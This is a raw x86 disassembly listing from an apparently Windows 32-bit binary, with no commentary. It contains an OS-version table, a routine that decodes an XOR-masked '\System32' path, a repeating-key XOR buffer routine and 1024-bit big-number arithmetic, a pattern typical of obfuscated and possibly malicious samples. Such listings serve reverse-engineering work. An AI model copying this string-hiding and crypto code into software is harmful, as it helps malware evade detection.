  4015b4:	c3                   	ret
  4015b5:	e9 8d 00 00 00       	jmp    0x401647
  4015ba:	83 fe 05             	cmp    $0x5,%esi
  4015bd:	75 0f                	jne    0x4015ce
  4015bf:	83 ff 02             	cmp    $0x2,%edi
  4015c2:	75 0a                	jne    0x4015ce
  4015c4:	b8 34 00 00 00       	mov    $0x34,%eax
  4015c9:	5f                   	pop    %edi
  4015ca:	5e                   	pop    %esi
  4015cb:	c3                   	ret
  4015cc:	eb 79                	jmp    0x401647
  4015ce:	83 fe 06             	cmp    $0x6,%esi
  4015d1:	75 0e                	jne    0x4015e1
  4015d3:	85 ff                	test   %edi,%edi
  4015d5:	75 0a                	jne    0x4015e1
  4015d7:	b8 3c 00 00 00       	mov    $0x3c,%eax
  4015dc:	5f                   	pop    %edi
  4015dd:	5e                   	pop    %esi
  4015de:	c3                   	ret
  4015df:	eb 66                	jmp    0x401647
  4015e1:	83 fe 06             	cmp    $0x6,%esi
  4015e4:	75 0f                	jne    0x4015f5
  4015e6:	83 ff 01             	cmp    $0x1,%edi
  4015e9:	75 0a                	jne    0x4015f5
  4015eb:	b8 3d 00 00 00       	mov    $0x3d,%eax
  4015f0:	5f                   	pop    %edi
  4015f1:	5e                   	pop    %esi
  4015f2:	c3                   	ret
  4015f3:	eb 52                	jmp    0x401647
  4015f5:	83 fe 06             	cmp    $0x6,%esi
  4015f8:	75 0f                	jne    0x401609
  4015fa:	83 ff 02             	cmp    $0x2,%edi
  4015fd:	75 0a                	jne    0x401609
  4015ff:	b8 3e 00 00 00       	mov    $0x3e,%eax
  401604:	5f                   	pop    %edi
  401605:	5e                   	pop    %esi
  401606:	c3                   	ret
  401607:	eb 3e                	jmp    0x401647
  401609:	83 fe 06             	cmp    $0x6,%esi
  40160c:	75 0f                	jne    0x40161d
  40160e:	83 ff 03             	cmp    $0x3,%edi
  401611:	75 0a                	jne    0x40161d
  401613:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401618:	5f                   	pop    %edi
  401619:	5e                   	pop    %esi
  40161a:	c3                   	ret
  40161b:	eb 2a                	jmp    0x401647
  40161d:	83 fe 0a             	cmp    $0xa,%esi
  401620:	75 0e                	jne    0x401630
  401622:	85 ff                	test   %edi,%edi
  401624:	75 0a                	jne    0x401630
  401626:	b8 64 00 00 00       	mov    $0x64,%eax
  40162b:	5f                   	pop    %edi
  40162c:	5e                   	pop    %esi
  40162d:	c3                   	ret
  40162e:	eb 17                	jmp    0x401647
  401630:	83 fe 0a             	cmp    $0xa,%esi
  401633:	75 05                	jne    0x40163a
  401635:	83 ff 00             	cmp    $0x0,%edi
  401638:	77 05                	ja     0x40163f
  40163a:	83 fe 0a             	cmp    $0xa,%esi
  40163d:	76 08                	jbe    0x401647
  40163f:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401644:	5f                   	pop    %edi
  401645:	5e                   	pop    %esi
  401646:	c3                   	ret
  401647:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40164c:	5f                   	pop    %edi
  40164d:	5e                   	pop    %esi
  40164e:	c3                   	ret
  40164f:	90                   	nop
  401650:	e8 57 fa ff ff       	call   0x4010ac
  401655:	8b 40 10             	mov    0x10(%eax),%eax
  401658:	8b 40 44             	mov    0x44(%eax),%eax
  40165b:	c3                   	ret
  40165c:	e8 4b fa ff ff       	call   0x4010ac
  401661:	8b 40 10             	mov    0x10(%eax),%eax
  401664:	8b 40 3c             	mov    0x3c(%eax),%eax
  401667:	c3                   	ret
  401668:	55                   	push   %ebp
  401669:	8b ec                	mov    %esp,%ebp
  40166b:	56                   	push   %esi
  40166c:	57                   	push   %edi
  40166d:	be c7 bf fd 37       	mov    $0x37fdbfc7,%esi
  401672:	81 f6 c7 bf 03 48    	xor    $0x4803bfc7,%esi
  401678:	8d 76 30             	lea    0x30(%esi),%esi
  40167b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40167e:	66 ad                	lods   %ds:(%esi),%ax
  401680:	66 85 c0             	test   %ax,%ax
  401683:	75 39                	jne    0x4016be
  401685:	66 b8 5c 00          	mov    $0x5c,%ax
  401689:	66 ab                	stos   %ax,%es:(%edi)
  40168b:	b8 94 bf 7a 48       	mov    $0x487abf94,%eax
  401690:	35 c7 bf 03 48       	xor    $0x4803bfc7,%eax
  401695:	ab                   	stos   %eax,%es:(%edi)
  401696:	b8 b4 bf 77 48       	mov    $0x4877bfb4,%eax
  40169b:	35 c7 bf 03 48       	xor    $0x4803bfc7,%eax
  4016a0:	ab                   	stos   %eax,%es:(%edi)
  4016a1:	b8 a2 bf 6e 48       	mov    $0x486ebfa2,%eax
  4016a6:	35 c7 bf 03 48       	xor    $0x4803bfc7,%eax
  4016ab:	ab                   	stos   %eax,%es:(%edi)
  4016ac:	b8 f4 bf 31 48       	mov    $0x4831bff4,%eax
  4016b1:	35 c7 bf 03 48       	xor    $0x4803bfc7,%eax
  4016b6:	ab                   	stos   %eax,%es:(%edi)
  4016b7:	66 33 c0             	xor    %ax,%ax
  4016ba:	66 ab                	stos   %ax,%es:(%edi)
  4016bc:	eb 04                	jmp    0x4016c2
  4016be:	66 ab                	stos   %ax,%es:(%edi)
  4016c0:	eb bc                	jmp    0x40167e
  4016c2:	5f                   	pop    %edi
  4016c3:	5e                   	pop    %esi
  4016c4:	5d                   	pop    %ebp
  4016c5:	c2 04 00             	ret    $0x4
  4016c8:	b8 d8 02 fe 7f       	mov    $0x7ffe02d8,%eax
  4016cd:	8b 00                	mov    (%eax),%eax
  4016cf:	c3                   	ret
  4016d0:	55                   	push   %ebp
  4016d1:	8b ec                	mov    %esp,%ebp
  4016d3:	53                   	push   %ebx
  4016d4:	51                   	push   %ecx
  4016d5:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4016d9:	74 1e                	je     0x4016f9
  4016db:	33 c0                	xor    %eax,%eax
  4016dd:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4016e0:	eb 01                	jmp    0x4016e3
  4016e2:	40                   	inc    %eax
  4016e3:	66 83 3c 43 00       	cmpw   $0x0,(%ebx,%eax,2)
  4016e8:	75 f8                	jne    0x4016e2
  4016ea:	66 83 7c 43 fe 5c    	cmpw   $0x5c,-0x2(%ebx,%eax,2)
  4016f0:	74 07                	je     0x4016f9
  4016f2:	c7 04 43 5c 00 00 00 	movl   $0x5c,(%ebx,%eax,2)
  4016f9:	59                   	pop    %ecx
  4016fa:	5b                   	pop    %ebx
  4016fb:	5d                   	pop    %ebp
  4016fc:	c2 04 00             	ret    $0x4
  4016ff:	90                   	nop
  401700:	55                   	push   %ebp
  401701:	8b ec                	mov    %esp,%ebp
  401703:	53                   	push   %ebx
  401704:	51                   	push   %ecx
  401705:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401709:	74 1f                	je     0x40172a
  40170b:	33 c0                	xor    %eax,%eax
  40170d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401710:	eb 01                	jmp    0x401713
  401712:	40                   	inc    %eax
  401713:	66 83 3c 43 00       	cmpw   $0x0,(%ebx,%eax,2)
  401718:	75 f8                	jne    0x401712
  40171a:	66 83 7c 43 fe 5c    	cmpw   $0x5c,-0x2(%ebx,%eax,2)
  401720:	75 08                	jne    0x40172a
  401722:	c7 44 43 fe 00 00 00 	movl   $0x0,-0x2(%ebx,%eax,2)
  401729:	00 
  40172a:	59                   	pop    %ecx
  40172b:	5b                   	pop    %ebx
  40172c:	5d                   	pop    %ebp
  40172d:	c2 04 00             	ret    $0x4
  401730:	55                   	push   %ebp
  401731:	8b ec                	mov    %esp,%ebp
  401733:	83 c4 f4             	add    $0xfffffff4,%esp
  401736:	53                   	push   %ebx
  401737:	51                   	push   %ecx
  401738:	56                   	push   %esi
  401739:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40173c:	8b 75 08             	mov    0x8(%ebp),%esi
  40173f:	8d 05 00 60 42 00    	lea    0x426000,%eax
  401745:	8b 50 04             	mov    0x4(%eax),%edx
  401748:	8b 00                	mov    (%eax),%eax
  40174a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40174d:	89 55 f8             	mov    %edx,-0x8(%ebp)
  401750:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401753:	50                   	push   %eax
  401754:	68 00 60 42 00       	push   $0x426000
  401759:	e8 5e 00 00 00       	call   0x4017bc
  40175e:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  401765:	30 06                	xor    %al,(%esi)
  401767:	46                   	inc    %esi
  401768:	4b                   	dec    %ebx
  401769:	85 db                	test   %ebx,%ebx
  40176b:	75 09                	jne    0x401776
  40176d:	5e                   	pop    %esi
  40176e:	59                   	pop    %ecx
  40176f:	5b                   	pop    %ebx
  401770:	8b e5                	mov    %ebp,%esp
  401772:	5d                   	pop    %ebp
  401773:	c2 08 00             	ret    $0x8
  401776:	30 36                	xor    %dh,(%esi)
  401778:	46                   	inc    %esi
  401779:	4b                   	dec    %ebx
  40177a:	85 db                	test   %ebx,%ebx
  40177c:	75 09                	jne    0x401787
  40177e:	5e                   	pop    %esi
  40177f:	59                   	pop    %ecx
  401780:	5b                   	pop    %ebx
  401781:	8b e5                	mov    %ebp,%esp
  401783:	5d                   	pop    %ebp
  401784:	c2 08 00             	ret    $0x8
  401787:	30 26                	xor    %ah,(%esi)
  401789:	46                   	inc    %esi
  40178a:	4b                   	dec    %ebx
  40178b:	85 db                	test   %ebx,%ebx
  40178d:	75 09                	jne    0x401798
  40178f:	5e                   	pop    %esi
  401790:	59                   	pop    %ecx
  401791:	5b                   	pop    %ebx
  401792:	8b e5                	mov    %ebp,%esp
  401794:	5d                   	pop    %ebp
  401795:	c2 08 00             	ret    $0x8
  401798:	30 16                	xor    %dl,(%esi)
  40179a:	46                   	inc    %esi
  40179b:	4b                   	dec    %ebx
  40179c:	85 db                	test   %ebx,%ebx
  40179e:	75 09                	jne    0x4017a9
  4017a0:	5e                   	pop    %esi
  4017a1:	59                   	pop    %ecx
  4017a2:	5b                   	pop    %ebx
  4017a3:	8b e5                	mov    %ebp,%esp
  4017a5:	5d                   	pop    %ebp
  4017a6:	c2 08 00             	ret    $0x8
  4017a9:	c1 e8 10             	shr    $0x10,%eax
  4017ac:	c1 ea 10             	shr    $0x10,%edx
  4017af:	ff 4d fc             	decl   -0x4(%ebp)
  4017b2:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4017b6:	75 ad                	jne    0x401765
  4017b8:	eb 96                	jmp    0x401750
  4017ba:	8b ff                	mov    %edi,%edi
  4017bc:	ff 25 9c 51 42 00    	jmp    *0x42519c
  4017c2:	8b ff                	mov    %edi,%edi
  4017c4:	55                   	push   %ebp
  4017c5:	8b ec                	mov    %esp,%ebp
  4017c7:	81 ec 28 01 00 00    	sub    $0x128,%esp
  4017cd:	53                   	push   %ebx
  4017ce:	56                   	push   %esi
  4017cf:	57                   	push   %edi
  4017d0:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  4017d6:	83 c0 0f             	add    $0xf,%eax
  4017d9:	83 e0 f0             	and    $0xfffffff0,%eax
  4017dc:	89 85 dc fe ff ff    	mov    %eax,-0x124(%ebp)
  4017e2:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4017e8:	83 c0 0f             	add    $0xf,%eax
  4017eb:	83 e0 f0             	and    $0xfffffff0,%eax
  4017ee:	89 85 d8 fe ff ff    	mov    %eax,-0x128(%ebp)
  4017f4:	8b 85 dc fe ff ff    	mov    -0x124(%ebp),%eax
  4017fa:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  401800:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  401807:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40180e:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  401815:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  40181c:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%eax)
  401823:	c7 40 18 00 00 00 00 	movl   $0x0,0x18(%eax)
  40182a:	c7 40 1c 00 00 00 00 	movl   $0x0,0x1c(%eax)
  401831:	c7 40 20 00 00 00 00 	movl   $0x0,0x20(%eax)
  401838:	c7 40 24 00 00 00 00 	movl   $0x0,0x24(%eax)
  40183f:	c7 40 28 00 00 00 00 	movl   $0x0,0x28(%eax)
  401846:	c7 40 2c 00 00 00 00 	movl   $0x0,0x2c(%eax)
  40184d:	c7 40 30 00 00 00 00 	movl   $0x0,0x30(%eax)
  401854:	c7 40 34 00 00 00 00 	movl   $0x0,0x34(%eax)
  40185b:	c7 40 38 00 00 00 00 	movl   $0x0,0x38(%eax)
  401862:	c7 40 3c 00 00 00 00 	movl   $0x0,0x3c(%eax)
  401869:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%eax)
  401870:	c7 40 44 00 00 00 00 	movl   $0x0,0x44(%eax)
  401877:	c7 40 48 00 00 00 00 	movl   $0x0,0x48(%eax)
  40187e:	c7 40 4c 00 00 00 00 	movl   $0x0,0x4c(%eax)
  401885:	c7 40 50 00 00 00 00 	movl   $0x0,0x50(%eax)
  40188c:	c7 40 54 00 00 00 00 	movl   $0x0,0x54(%eax)
  401893:	c7 40 58 00 00 00 00 	movl   $0x0,0x58(%eax)
  40189a:	c7 40 5c 00 00 00 00 	movl   $0x0,0x5c(%eax)
  4018a1:	c7 40 60 00 00 00 00 	movl   $0x0,0x60(%eax)
  4018a8:	c7 40 64 00 00 00 00 	movl   $0x0,0x64(%eax)
  4018af:	c7 40 68 00 00 00 00 	movl   $0x0,0x68(%eax)
  4018b6:	c7 40 6c 00 00 00 00 	movl   $0x0,0x6c(%eax)
  4018bd:	c7 40 70 00 00 00 00 	movl   $0x0,0x70(%eax)
  4018c4:	c7 40 74 00 00 00 00 	movl   $0x0,0x74(%eax)
  4018cb:	c7 40 78 00 00 00 00 	movl   $0x0,0x78(%eax)
  4018d2:	c7 40 7c 00 00 00 00 	movl   $0x0,0x7c(%eax)
  4018d9:	fe 00                	incb   (%eax)
  4018db:	ff 75 08             	push   0x8(%ebp)
  4018de:	ff 75 0c             	push   0xc(%ebp)
  4018e1:	ff b5 d8 fe ff ff    	push   -0x128(%ebp)
  4018e7:	ff b5 dc fe ff ff    	push   -0x124(%ebp)
  4018ed:	e8 56 00 00 00       	call   0x401948
  4018f2:	6a 00                	push   $0x0
  4018f4:	ff 75 0c             	push   0xc(%ebp)
  4018f7:	ff b5 d8 fe ff ff    	push   -0x128(%ebp)
  4018fd:	ff b5 dc fe ff ff    	push   -0x124(%ebp)
  401903:	e8 40 00 00 00       	call   0x401948
  401908:	ff 75 08             	push   0x8(%ebp)
  40190b:	ff 75 0c             	push   0xc(%ebp)
  40190e:	ff b5 d8 fe ff ff    	push   -0x128(%ebp)
  401914:	ff b5 dc fe ff ff    	push   -0x124(%ebp)
  40191a:	e8 29 00 00 00       	call   0x401948
  40191f:	8b 85 dc fe ff ff    	mov    -0x124(%ebp),%eax
  401925:	8b 55 08             	mov    0x8(%ebp),%edx
  401928:	b9 08 00 00 00       	mov    $0x8,%ecx
  40192d:	0f 10 00             	movups (%eax),%xmm0
  401930:	0f 11 02             	movups %xmm0,(%edx)
  401933:	83 c0 10             	add    $0x10,%eax
  401936:	83 c2 10             	add    $0x10,%edx
  401939:	49                   	dec    %ecx
  40193a:	85 c9                	test   %ecx,%ecx
  40193c:	75 ef                	jne    0x40192d
  40193e:	5f                   	pop    %edi
  40193f:	5e                   	pop    %esi
  401940:	5b                   	pop    %ebx
  401941:	8b e5                	mov    %ebp,%esp
  401943:	5d                   	pop    %ebp
  401944:	c2 08 00             	ret    $0x8
  401947:	90                   	nop
  401948:	55                   	push   %ebp
  401949:	8b ec                	mov    %esp,%ebp
  40194b:	53                   	push   %ebx
  40194c:	56                   	push   %esi
  40194d:	57                   	push   %edi
  40194e:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401951:	8b 75 08             	mov    0x8(%ebp),%esi
  401954:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401957:	b9 08 00 00 00       	mov    $0x8,%ecx
  40195c:	56                   	push   %esi
  40195d:	57                   	push   %edi
  40195e:	66 0f 6f 06          	movdqa (%esi),%xmm0
  401962:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  401966:	83 c6 10             	add    $0x10,%esi
  401969:	83 c7 10             	add    $0x10,%edi
  40196c:	49                   	dec    %ecx
  40196d:	85 c9                	test   %ecx,%ecx
  40196f:	75 ed                	jne    0x40195e
  401971:	5f                   	pop    %edi
  401972:	5e                   	pop    %esi
  401973:	53                   	push   %ebx
  401974:	57                   	push   %edi
  401975:	56                   	push   %esi
  401976:	e8 31 01 00 00       	call   0x401aac
  40197b:	b9 08 00 00 00       	mov    $0x8,%ecx
  401980:	56                   	push   %esi
  401981:	57                   	push   %edi
  401982:	66 0f 6f 06          	movdqa (%esi),%xmm0
  401986:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  40198a:	83 c6 10             	add    $0x10,%esi
  40198d:	83 c7 10             	add    $0x10,%edi
  401990:	49                   	dec    %ecx
  401991:	85 c9                	test   %ecx,%ecx
  401993:	75 ed                	jne    0x401982
  401995:	5f                   	pop    %edi
  401996:	5e                   	pop    %esi
  401997:	53                   	push   %ebx
  401998:	57                   	push   %edi
  401999:	56                   	push   %esi
  40199a:	e8 0d 01 00 00       	call   0x401aac
  40199f:	b9 08 00 00 00       	mov    $0x8,%ecx
  4019a4:	56                   	push   %esi
  4019a5:	57                   	push   %edi
  4019a6:	66 0f 6f 06          	movdqa (%esi),%xmm0
  4019aa:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  4019ae:	83 c6 10             	add    $0x10,%esi
  4019b1:	83 c7 10             	add    $0x10,%edi
  4019b4:	49                   	dec    %ecx
  4019b5:	85 c9                	test   %ecx,%ecx
  4019b7:	75 ed                	jne    0x4019a6
  4019b9:	5f                   	pop    %edi
  4019ba:	5e                   	pop    %esi
  4019bb:	53                   	push   %ebx
  4019bc:	57                   	push   %edi
  4019bd:	56                   	push   %esi
  4019be:	e8 e9 00 00 00       	call   0x401aac
  4019c3:	b9 08 00 00 00       	mov    $0x8,%ecx
  4019c8:	56                   	push   %esi
  4019c9:	57                   	push   %edi
  4019ca:	66 0f 6f 06          	movdqa (%esi),%xmm0
  4019ce:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  4019d2:	83 c6 10             	add    $0x10,%esi
  4019d5:	83 c7 10             	add    $0x10,%edi
  4019d8:	49                   	dec    %ecx
  4019d9:	85 c9                	test   %ecx,%ecx
  4019db:	75 ed                	jne    0x4019ca
  4019dd:	5f                   	pop    %edi
  4019de:	5e                   	pop    %esi
  4019df:	53                   	push   %ebx
  4019e0:	57                   	push   %edi
  4019e1:	56                   	push   %esi
  4019e2:	e8 c5 00 00 00       	call   0x401aac
  4019e7:	b9 08 00 00 00       	mov    $0x8,%ecx
  4019ec:	56                   	push   %esi
  4019ed:	57                   	push   %edi
  4019ee:	66 0f 6f 06          	movdqa (%esi),%xmm0
  4019f2:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  4019f6:	83 c6 10             	add    $0x10,%esi
  4019f9:	83 c7 10             	add    $0x10,%edi
  4019fc:	49                   	dec    %ecx
  4019fd:	85 c9                	test   %ecx,%ecx
  4019ff:	75 ed                	jne    0x4019ee
  401a01:	5f                   	pop    %edi
  401a02:	5e                   	pop    %esi
  401a03:	53                   	push   %ebx
  401a04:	57                   	push   %edi
  401a05:	56                   	push   %esi
  401a06:	e8 a1 00 00 00       	call   0x401aac
  401a0b:	b9 08 00 00 00       	mov    $0x8,%ecx
  401a10:	56                   	push   %esi
  401a11:	57                   	push   %edi
  401a12:	66 0f 6f 06          	movdqa (%esi),%xmm0
  401a16:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  401a1a:	83 c6 10             	add    $0x10,%esi
  401a1d:	83 c7 10             	add    $0x10,%edi
  401a20:	49                   	dec    %ecx
  401a21:	85 c9                	test   %ecx,%ecx
  401a23:	75 ed                	jne    0x401a12
  401a25:	5f                   	pop    %edi
  401a26:	5e                   	pop    %esi
  401a27:	53                   	push   %ebx
  401a28:	57                   	push   %edi
  401a29:	56                   	push   %esi
  401a2a:	e8 7d 00 00 00       	call   0x401aac
  401a2f:	b9 08 00 00 00       	mov    $0x8,%ecx
  401a34:	56                   	push   %esi
  401a35:	57                   	push   %edi
  401a36:	66 0f 6f 06          	movdqa (%esi),%xmm0
  401a3a:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  401a3e:	83 c6 10             	add    $0x10,%esi
  401a41:	83 c7 10             	add    $0x10,%edi
  401a44:	49                   	dec    %ecx
  401a45:	85 c9                	test   %ecx,%ecx
  401a47:	75 ed                	jne    0x401a36
  401a49:	5f                   	pop    %edi
  401a4a:	5e                   	pop    %esi
  401a4b:	53                   	push   %ebx
  401a4c:	57                   	push   %edi
  401a4d:	56                   	push   %esi
  401a4e:	e8 59 00 00 00       	call   0x401aac
  401a53:	b9 08 00 00 00       	mov    $0x8,%ecx
  401a58:	56                   	push   %esi
  401a59:	57                   	push   %edi
  401a5a:	66 0f 6f 06          	movdqa (%esi),%xmm0
  401a5e:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  401a62:	83 c6 10             	add    $0x10,%esi
  401a65:	83 c7 10             	add    $0x10,%edi
  401a68:	49                   	dec    %ecx
  401a69:	85 c9                	test   %ecx,%ecx
  401a6b:	75 ed                	jne    0x401a5a
  401a6d:	5f                   	pop    %edi
  401a6e:	5e                   	pop    %esi
  401a6f:	53                   	push   %ebx
  401a70:	57                   	push   %edi
  401a71:	56                   	push   %esi
  401a72:	e8 35 00 00 00       	call   0x401aac
  401a77:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  401a7b:	74 26                	je     0x401aa3
  401a7d:	b9 08 00 00 00       	mov    $0x8,%ecx
  401a82:	56                   	push   %esi
  401a83:	57                   	push   %edi
  401a84:	66 0f 6f 06          	movdqa (%esi),%xmm0
  401a88:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  401a8c:	83 c6 10             	add    $0x10,%esi
  401a8f:	83 c7 10             	add    $0x10,%edi
  401a92:	49                   	dec    %ecx
  401a93:	85 c9                	test   %ecx,%ecx
  401a95:	75 ed                	jne    0x401a84
  401a97:	5f                   	pop    %edi
  401a98:	5e                   	pop    %esi
  401a99:	53                   	push   %ebx
  401a9a:	ff 75 14             	push   0x14(%ebp)
  401a9d:	56                   	push   %esi
  401a9e:	e8 09 00 00 00       	call   0x401aac
  401aa3:	5f                   	pop    %edi
  401aa4:	5e                   	pop    %esi
  401aa5:	5b                   	pop    %ebx
  401aa6:	5d                   	pop    %ebp
  401aa7:	c2 10 00             	ret    $0x10
  401aaa:	8b ff                	mov    %edi,%edi
  401aac:	55                   	push   %ebp
  401aad:	8b ec                	mov    %esp,%ebp
  401aaf:	81 ec 98 00 00 00    	sub    $0x98,%esp
  401ab5:	53                   	push   %ebx
  401ab6:	56                   	push   %esi
  401ab7:	57                   	push   %edi
  401ab8:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  401abe:	83 c0 0f             	add    $0xf,%eax
  401ac1:	83 e0 f0             	and    $0xfffffff0,%eax
  401ac4:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  401aca:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401ad0:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  401ad6:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  401add:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  401ae4:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  401aeb:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  401af2:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%eax)
  401af9:	c7 40 18 00 00 00 00 	movl   $0x0,0x18(%eax)
  401b00:	c7 40 1c 00 00 00 00 	movl   $0x0,0x1c(%eax)
  401b07:	c7 40 20 00 00 00 00 	movl   $0x0,0x20(%eax)
  401b0e:	c7 40 24 00 00 00 00 	movl   $0x0,0x24(%eax)
  401b15:	c7 40 28 00 00 00 00 	movl   $0x0,0x28(%eax)
  401b1c:	c7 40 2c 00 00 00 00 	movl   $0x0,0x2c(%eax)
  401b23:	c7 40 30 00 00 00 00 	movl   $0x0,0x30(%eax)
  401b2a:	c7 40 34 00 00 00 00 	movl   $0x0,0x34(%eax)
  401b31:	c7 40 38 00 00 00 00 	movl   $0x0,0x38(%eax)
  401b38:	c7 40 3c 00 00 00 00 	movl   $0x0,0x3c(%eax)
  401b3f:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%eax)
  401b46:	c7 40 44 00 00 00 00 	movl   $0x0,0x44(%eax)
  401b4d:	c7 40 48 00 00 00 00 	movl   $0x0,0x48(%eax)
  401b54:	c7 40 4c 00 00 00 00 	movl   $0x0,0x4c(%eax)
  401b5b:	c7 40 50 00 00 00 00 	movl   $0x0,0x50(%eax)
  401b62:	c7 40 54 00 00 00 00 	movl   $0x0,0x54(%eax)
  401b69:	c7 40 58 00 00 00 00 	movl   $0x0,0x58(%eax)
  401b70:	c7 40 5c 00 00 00 00 	movl   $0x0,0x5c(%eax)
  401b77:	c7 40 60 00 00 00 00 	movl   $0x0,0x60(%eax)
  401b7e:	c7 40 64 00 00 00 00 	movl   $0x0,0x64(%eax)
  401b85:	c7 40 68 00 00 00 00 	movl   $0x0,0x68(%eax)
  401b8c:	c7 40 6c 00 00 00 00 	movl   $0x0,0x6c(%eax)
  401b93:	c7 40 70 00 00 00 00 	movl   $0x0,0x70(%eax)
  401b9a:	c7 40 74 00 00 00 00 	movl   $0x0,0x74(%eax)
  401ba1:	c7 40 78 00 00 00 00 	movl   $0x0,0x78(%eax)
  401ba8:	c7 40 7c 00 00 00 00 	movl   $0x0,0x7c(%eax)
  401baf:	c7 85 68 ff ff ff 00 	movl   $0x400,-0x98(%ebp)
  401bb6:	04 00 00 
  401bb9:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401bbf:	f8                   	clc
  401bc0:	d1 10                	rcll   $1,(%eax)
  401bc2:	d1 50 04             	rcll   $1,0x4(%eax)
  401bc5:	d1 50 08             	rcll   $1,0x8(%eax)
  401bc8:	d1 50 0c             	rcll   $1,0xc(%eax)
  401bcb:	d1 50 10             	rcll   $1,0x10(%eax)
  401bce:	d1 50 14             	rcll   $1,0x14(%eax)
  401bd1:	d1 50 18             	rcll   $1,0x18(%eax)
  401bd4:	d1 50 1c             	rcll   $1,0x1c(%eax)
  401bd7:	d1 50 20             	rcll   $1,0x20(%eax)
  401bda:	d1 50 24             	rcll   $1,0x24(%eax)
  401bdd:	d1 50 28             	rcll   $1,0x28(%eax)
  401be0:	d1 50 2c             	rcll   $1,0x2c(%eax)
  401be3:	d1 50 30             	rcll   $1,0x30(%eax)
  401be6:	d1 50 34             	rcll   $1,0x34(%eax)
  401be9:	d1 50 38             	rcll   $1,0x38(%eax)
  401bec:	d1 50 3c             	rcll   $1,0x3c(%eax)
  401bef:	d1 50 40             	rcll   $1,0x40(%eax)
  401bf2:	d1 50 44             	rcll   $1,0x44(%eax)
  401bf5:	d1 50 48             	rcll   $1,0x48(%eax)
  401bf8:	d1 50 4c             	rcll   $1,0x4c(%eax)
  401bfb:	d1 50 50             	rcll   $1,0x50(%eax)
  401bfe:	d1 50 54             	rcll   $1,0x54(%eax)
  401c01:	d1 50 58             	rcll   $1,0x58(%eax)
  401c04:	d1 50 5c             	rcll   $1,0x5c(%eax)
  401c07:	d1 50 60             	rcll   $1,0x60(%eax)
  401c0a:	d1 50 64             	rcll   $1,0x64(%eax)
  401c0d:	d1 50 68             	rcll   $1,0x68(%eax)
  401c10:	d1 50 6c             	rcll   $1,0x6c(%eax)
  401c13:	d1 50 70             	rcll   $1,0x70(%eax)
  401c16:	d1 50 74             	rcll   $1,0x74(%eax)
  401c19:	d1 50 78             	rcll   $1,0x78(%eax)
  401c1c:	d1 50 7c             	rcll   $1,0x7c(%eax)
  401c1f:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401c25:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401c28:	f8                   	clc
  401c29:	8b 11                	mov    (%ecx),%edx
  401c2b:	8b 59 04             	mov    0x4(%ecx),%ebx
  401c2e:	8b 71 08             	mov    0x8(%ecx),%esi
  401c31:	8b 79 0c             	mov    0xc(%ecx),%edi
  401c34:	19 10                	sbb    %edx,(%eax)
  401c36:	19 58 04             	sbb    %ebx,0x4(%eax)
  401c39:	19 70 08             	sbb    %esi,0x8(%eax)
  401c3c:	19 78 0c             	sbb    %edi,0xc(%eax)
  401c3f:	8b 51 10             	mov    0x10(%ecx),%edx
  401c42:	8b 59 14             	mov    0x14(%ecx),%ebx
  401c45:	8b 71 18             	mov    0x18(%ecx),%esi
  401c48:	8b 79 1c             	mov    0x1c(%ecx),%edi
  401c4b:	19 50 10             	sbb    %edx,0x10(%eax)
  401c4e:	19 58 14             	sbb    %ebx,0x14(%eax)
  401c51:	19 70 18             	sbb    %esi,0x18(%eax)
  401c54:	19 78 1c             	sbb    %edi,0x1c(%eax)
  401c57:	8b 51 20             	mov    0x20(%ecx),%edx
  401c5a:	8b 59 24             	mov    0x24(%ecx),%ebx
  401c5d:	8b 71 28             	mov    0x28(%ecx),%esi
  401c60:	8b 79 2c             	mov    0x2c(%ecx),%edi
  401c63:	19 50 20             	sbb    %edx,0x20(%eax)
  401c66:	19 58 24             	sbb    %ebx,0x24(%eax)
  401c69:	19 70 28             	sbb    %esi,0x28(%eax)
  401c6c:	19 78 2c             	sbb    %edi,0x2c(%eax)
